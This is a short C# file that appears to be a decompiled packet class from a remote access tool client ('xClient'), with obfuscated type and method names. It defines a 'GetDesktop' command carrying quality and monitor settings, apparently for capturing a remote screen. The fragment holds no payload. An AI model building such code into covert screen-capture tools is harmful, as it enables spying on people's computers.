using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class GetDesktop : GInterface4
{
	public int Quality { get; set; }

	public int Monitor { get; set; }

	public GetDesktop()
	{
	}

	public GetDesktop(int quality, int monitor)
	{
		Quality = quality;
		Monitor = monitor;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
